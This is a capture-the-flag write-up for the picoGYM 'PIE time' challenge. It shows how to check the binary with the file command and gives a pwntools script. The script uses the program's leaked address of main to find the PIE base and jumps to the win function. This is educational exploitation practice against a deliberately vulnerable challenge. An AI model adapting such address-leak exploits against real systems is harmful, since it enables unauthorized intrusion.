
# PIE time writeup (picoGYM chall)

Ill download it and do the basic checks before beginning the exploiting. The challenge includes the src but I wont download it to make it a bit more challenging.

<code style="white-space: nowrap; display: block; overflow-x: auto;">
$ wget 'https://challenge-files.picoctf.net/c_rescued_float/d5c65372e63f3e149158631ad54b371427827b833b3f5f50aba3eaee5c6a98e5/vuln'
</code>

Lets run that file: 

 ```
 $ file vuln
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0072413e1b5a0613219f45518ded05fc685b680a, for GNU/Linux 3.2.0, not stripped
 ```

So this tells us that PIE is enabled - though I probably could've guessed from the name. Its dynamically linked so requires files that aren't included in the executable to run properly. And its not stripped so it will be include plenty of information to debug and reverse.


Lets run it: 

``` ./vuln
Address of main: 0x55c0b167b33d
Enter the address to jump to, ex => 0x12345: 
```

So it leaks the address of main, and even gives us an input to jump to an address, so we don't even have to do a buffer overflow.
All thats required to beat this is to find the PIE base by subtracting the leaked main address from the PIE protected main address we would find if we were to reverse the program. 

Ill write a script to do that. 
```from pwn import *
#setup
elf = context.binary = ELF('./vuln')
ip = "rescued-float.picoctf.net"
port = 63517

#create proccess
# p = remote(ip, port)
p = process()

#get the leaked address and subtract the pieed address from it
p.recvuntil(':')
main_addr = int(p.recvline().strip(), 16)
elf.address = main_addr - elf.sym.main

#package in hex and send back to the program
payload = hex(elf.sym.win).encode()

p.sendline(payload)
p.interactive()
```

